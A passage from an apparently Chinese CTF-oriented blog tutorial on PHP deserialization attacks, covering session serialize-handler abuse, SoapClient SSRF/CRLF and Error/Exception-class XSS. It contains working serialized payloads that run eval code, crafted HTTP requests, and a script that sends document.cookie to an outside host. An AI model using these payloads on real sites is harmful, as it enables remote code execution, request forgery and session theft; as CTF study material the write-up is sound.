 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div>



<p>最终写入的内容：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">|O:<span class="hljs-number">4</span>:\<span class="hljs-string">&quot;foo1\&quot;:1:&#123;s:4:\&quot;varr\&quot;;O:4:\&quot;foo2\&quot;:2:&#123;s:4:\&quot;varr\&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;obj\&quot;;O:4:\&quot;foo3\&quot;:1:&#123;s:4:\&quot;varr\&quot;;s:12:\&quot;var_dump(1);\&quot;;&#125;&#125;&#125;</span></code></pre></div>



<p>需要注意的是，在这道题的实践中发现，ini_set无法改变PHP_SESSION_UPLOAD_PROGRESS时序列化的方式，只有当php.ini文件中session.serialize_handler设置为php_serialize才能够以我们想要的格式存入session文件，再次访问index.php时，ini_set将反序列化引擎设置为php，这时候可以以php方式反序列化session文件。</p>
<p>另外，这道题没有开启cleanup，php中默认开启。如果开启后，可以使用条件竞争进行触发。</p>
<h4 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h4><blockquote>
<p>题目地址：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p>
</blockquote>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//A webshell is wait for you</span>
ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);
session_start();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);
    &#125;
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))
&#123;
    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();
&#125;
<span class="hljs-keyword">else</span>
&#123;
    highlight_string(file_get_contents(<span class="hljs-string">&#x27;sessiontest.php&#x27;</span>));
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>查看phpinfo中的几个关键值</p>
<ul>
<li><p>session.use_strict_mode    Off 表示我们可以控制session文件名</p>
</li>
<li><p>session.upload_progress.enabled    On 表示我们可以通过文件上传写入session文件</p>
</li>
<li><p>session.upload_progress.cleanup    Off 表示在上传成功后不会删除session文件，所以这道题不需要条件竞争</p>
</li>
<li><p>session.upload_progress.name    PHP_SESSION_UPLOAD_PROGRESS 默认值</p>
</li>
</ul>
<p>构造POST提交表单</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;
    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;123&quot;</span> /&gt;
    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;
    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> /&gt;
&lt;/form&gt;</code></pre></div>



<p>payload：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span></code></pre></div>



<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911152146508.png" alt="image-20200911152146508"></p>
<ul>
<li>filename防止出错应该对双引号进行转义</li>
<li>再次访问的时候别忘了加上sessionid，不然每次都是新的session </li>
</ul>
<p><strong>python 脚本</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs plain"></code></pre></div>



<h3 id="例子2：配合call-user-func修改session配置"><a href="#例子2：配合call-user-func修改session配置" class="headerlink" title="例子2：配合call_user_func修改session配置"></a>例子2：配合call_user_func修改session配置</h3><h4 id="LCTF-签到题"><a href="#LCTF-签到题" class="headerlink" title="LCTF 签到题"></a>LCTF 签到题</h4><ul>
<li>利用回调函数来覆盖session默认的序列化引擎。</li>
<li>序列化到原生类Soap对象，将序列化语句写入session文件</li>
<li>b变量覆盖为call_user_func。</li>
<li>利用将对象与其方法构造成一个数组来进行函数调用，使得调用该对象的成员方法。这里是调用Soap的welcome_to_the_lctf2018方法，自然会触发__call</li>
<li>触发__call方法进行SSRF访问flag.php.</li>
<li>将flag写入session。题目会将session打印出来。</li>
</ul>
<p>获取Soap对象的序列化语句</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$url</span>));
<span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>





<p>burp发送</p>
<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/web/LCTF2018/babyrevenge/index.php?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A38%3A%22http%3A%2F%2F127.0.0.1%2Fweb%2FLCTF2018%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A38%3A%22http%3A%2F%2F127.0.0.1%2Fweb%2FLCTF2018%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.22
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=rbtgu59dmpicqgk0ffkunogg1l
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31

serialize_handler=php_serialize</code></pre></div>



<p>直接访问</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200828153146285.png" alt="image-20200828153146285"></p>
<p>已经反序列化成了soap对象</p>
<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/web/LCTF2018/babyrevenge/?f=extract&amp;name=SoapClient</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.22
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=rbtgu59dmpicqgk0ffkunogg1l; XDEBUG_SESSION=PHPSTORM
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16

b=call_user_func</code></pre></div>



<p>再次访问可以触发soap，但是我本地环境一直不成功。</p>
<h2 id="0x06-php反序列化扩展原生类利用"><a href="#0x06-php反序列化扩展原生类利用" class="headerlink" title="0x06 php反序列化扩展原生类利用"></a>0x06 php反序列化扩展原生类利用</h2><p><strong>查看php原生内置类的魔术方法。</strong>此脚本稍作修改既可用于查找原生类中的同名函数。</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$classes</span> = get_declared_classes();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;
    <span class="hljs-variable">$methods</span> = get_class_methods(<span class="hljs-variable">$class</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;
        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(
            <span class="hljs-string">&#x27;__destruct&#x27;</span>,
            <span class="hljs-string">&#x27;__toString&#x27;</span>,
            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,
            <span class="hljs-string">&#x27;__call&#x27;</span>,
            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,
            <span class="hljs-string">&#x27;__get&#x27;</span>,
            <span class="hljs-string">&#x27;__set&#x27;</span>,
            <span class="hljs-string">&#x27;__isset&#x27;</span>,
            <span class="hljs-string">&#x27;__unset&#x27;</span>,
            <span class="hljs-string">&#x27;__invoke&#x27;</span>,
            <span class="hljs-string">&#x27;__set_state&#x27;</span>
        ))) &#123;
            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<p>结果：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span>::__wakeup
<span class="hljs-built_in">Exception</span>::__toString
<span class="hljs-built_in">ErrorException</span>::__wakeup
<span class="hljs-built_in">ErrorException</span>::__toString
<span class="hljs-built_in">Error</span>::__wakeup
<span class="hljs-built_in">Error</span>::__toString
<span class="hljs-built_in">ParseError</span>::__wakeup
<span class="hljs-built_in">ParseError</span>::__toString
<span class="hljs-built_in">TypeError</span>::__wakeup
<span class="hljs-built_in">TypeError</span>::__toString
<span class="hljs-built_in">ArithmeticError</span>::__wakeup
<span class="hljs-built_in">ArithmeticError</span>::__toString
<span class="hljs-built_in">DivisionByZeroError</span>::__wakeup
<span class="hljs-built_in">DivisionByZeroError</span>::__toString
<span class="hljs-built_in">Generator</span>::__wakeup
ClosedGeneratorException::__wakeup
ClosedGeneratorException::__toString
DateTime::__wakeup
DateTime::__set_state
DateTimeImmutable::__wakeup
DateTimeImmutable::__set_state
DateTimeZone::__wakeup
DateTimeZone::__set_state
DateInterval::__wakeup
DateInterval::__set_state
DatePeriod::__wakeup
DatePeriod::__set_state
<span class="hljs-built_in">LogicException</span>::__wakeup
<span class="hljs-built_in">LogicException</span>::__toString
<span class="hljs-built_in">BadFunctionCallException</span>::__wakeup
<span class="hljs-built_in">BadFunctionCallException</span>::__toString
<span class="hljs-built_in">BadMethodCallException</span>::__wakeup
<span class="hljs-built_in">BadMethodCallException</span>::__toString
<span class="hljs-built_in">DomainException</span>::__wakeup
<span class="hljs-built_in">DomainException</span>::__toString
<span class="hljs-built_in">InvalidArgumentException</span>::__wakeup
<span class="hljs-built_in">InvalidArgumentException</span>::__toString
<span class="hljs-built_in">LengthException</span>::__wakeup
<span class="hljs-built_in">LengthException</span>::__toString
<span class="hljs-built_in">OutOfRangeException</span>::__wakeup
<span class="hljs-built_in">OutOfRangeException</span>::__toString
<span class="hljs-built_in">RuntimeException</span>::__wakeup
<span class="hljs-built_in">RuntimeException</span>::__toString
<span class="hljs-built_in">OutOfBoundsException</span>::__wakeup
<span class="hljs-built_in">OutOfBoundsException</span>::__toString
<span class="hljs-built_in">OverflowException</span>::__wakeup
<span class="hljs-built_in">OverflowException</span>::__toString
<span class="hljs-built_in">RangeException</span>::__wakeup
<span class="hljs-built_in">RangeException</span>::__toString
<span class="hljs-built_in">UnderflowException</span>::__wakeup
<span class="hljs-built_in">UnderflowException</span>::__toString
<span class="hljs-built_in">UnexpectedValueException</span>::__wakeup
<span class="hljs-built_in">UnexpectedValueException</span>::__toString
<span class="hljs-built_in">CachingIterator</span>::__toString
<span class="hljs-built_in">RecursiveCachingIterator</span>::__toString
<span class="hljs-built_in">SplFileInfo</span>::__toString
<span class="hljs-built_in">DirectoryIterator</span>::__toString
<span class="hljs-built_in">FilesystemIterator</span>::__toString
<span class="hljs-built_in">RecursiveDirectoryIterator</span>::__toString
<span class="hljs-built_in">GlobIterator</span>::__toString
<span class="hljs-built_in">SplFileObject</span>::__toString
<span class="hljs-built_in">SplTempFileObject</span>::__toString
<span class="hljs-built_in">SplFixedArray</span>::__wakeup
ReflectionException::__wakeup
ReflectionException::__toString
ReflectionFunctionAbstract::__toString
ReflectionFunction::__toString
ReflectionParameter::__toString
ReflectionType::__toString
ReflectionMethod::__toString
ReflectionClass::__toString
ReflectionObject::__toString
ReflectionProperty::__toString
ReflectionExtension::__toString
ReflectionZendExtension::__toString
<span class="hljs-built_in">AssertionError</span>::__wakeup
<span class="hljs-built_in">AssertionError</span>::__toString
DOMException::__wakeup
DOMException::__toString
PDOException::__wakeup
PDOException::__toString
PDO::__wakeup
PDOStatement::__wakeup
SimpleXMLElement::__toString
SimpleXMLIterator::__toString
CURLFile::__wakeup
mysqli_sql_exception::__wakeup
mysqli_sql_exception::__toString
PharException::__wakeup
PharException::__toString
Phar::__destruct
Phar::__toString
PharData::__destruct
PharData::__toString
PharFileInfo::__destruct
PharFileInfo::__toString
SoapClient::__call
SoapFault::__toString
SoapFault::__wakeup</code></pre></div>



<h3 id="SoapClient构造ssrf和crlf"><a href="#SoapClient构造ssrf和crlf" class="headerlink" title="SoapClient构造ssrf和crlf"></a>SoapClient构造ssrf和crlf</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165041409-1571225758.jpg" alt="img"></p>
<p>但是它仅限于http/https协议，可以构造post请求，导致ssrf。</p>
<p>这里http头部还存在crlf漏洞</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;CONFIG SET dir /root/&quot;</span>;
<span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://example.com:5555/&quot;</span>;
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello^^&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;^^hello&#x27;</span>));
<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>); 
<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);

<span class="hljs-comment">//Test</span>
<span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$aaa</span>);
<span class="hljs-variable">$c</span>-&gt;notexists();</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165113533-1948175046.jpg" alt="img"></p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是<code>content-type</code>的设置，当是可以看到上面的数据包，<code>user_agent</code>的头部是在<code>content-type</code>的下面，所以我们可以通过<code>SoapClient</code>来设置<code>user_agent</code>，再使用crlf将<code>content-type</code>给往下挤。</p>
<h4 id="来自wupco师傅构造任意post报文的poc"><a href="#来自wupco师傅构造任意post报文的poc" class="headerlink" title="来自wupco师傅构造任意post报文的poc:"></a><strong>来自wupco师傅构造任意post报文的poc:</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://example.com:5555/&quot;</span>;
<span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;
<span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(
    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,
    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span>
);
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));
<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);
<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165126622-199442235.jpg" alt="img"></p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>LCTF2018 签到题</p>
<h3 id="Error类构造xss"><a href="#Error类构造xss" class="headerlink" title="Error类构造xss"></a>Error类构造xss</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);
<span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);

<span class="hljs-comment">//Test</span>
<span class="hljs-variable">$t</span> = urldecode(<span class="hljs-string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span>);
<span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$t</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165139761-1813736165.jpg" alt="img"></p>
<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><h3 id="Exception类构造xss"><a href="#Exception类构造xss" class="headerlink" title="Exception类构造xss"></a>Exception类构造xss</h3><p>适用于php5、7版本</p>
<p>开启报错的情况下:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);
<span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);

<span class="hljs-comment">//Test</span>
<span class="hljs-variable">$c</span> = urldecode(<span class="hljs-string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);
<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$c</span>);</code></pre></div>



<h4 id="例子：BJDCTF-2rd-XSS之光"><a href="#例子：BJDCTF-2rd-XSS之光" class="headerlink" title="例子：BJDCTF 2rd XSS之光"></a>例子：BJDCTF 2rd XSS之光</h4><p>Git泄露，用GitHack dump下来：</p>
<p>只有一个<code>index.php</code>文件：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yds_is_so_beautiful&#x27;</span>];
<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$a</span>);</code></pre></div>

<blockquote>
<p>yds？？？杨大树？？？</p>
</blockquote>
<p>Error类就是php的一个内置类用于自动自定义一个<code>Error</code>，在php7的环境下可能会造成一个<code>xss</code>漏洞，因为它内置有一个<code>toString</code>的方法。</p>
<blockquote>
<p>Exception类跟Error类原理一样，但是也适用于PHP5</p>
</blockquote>
<p>我们先来验证一下：</p>
<p>POC</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);
<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre></div>

<p>得到编码后的反序列化结果：</p>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">25</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert%<span class="hljs-number">281</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">18</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fusercode%<span class="hljs-number">2</span>Ffile.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">16</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div>

<p>成功触发XSS。</p>
<p>也可以直接打cookie：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;</span>;
<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$s</span>);</code></pre></div>





<h3 id="原生类同名函数：ZipArchive-open-文件写"><a href="#原生类同名函数：ZipArchive-open-文件写" class="headerlink" title="原生类同名函数：ZipArchive::open 文件写"></a>原生类同名函数：ZipArchive::open 文件写</h3><p>首先先认识原生类同名函数的攻击漏洞，先假设我们有一个上传类如下</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
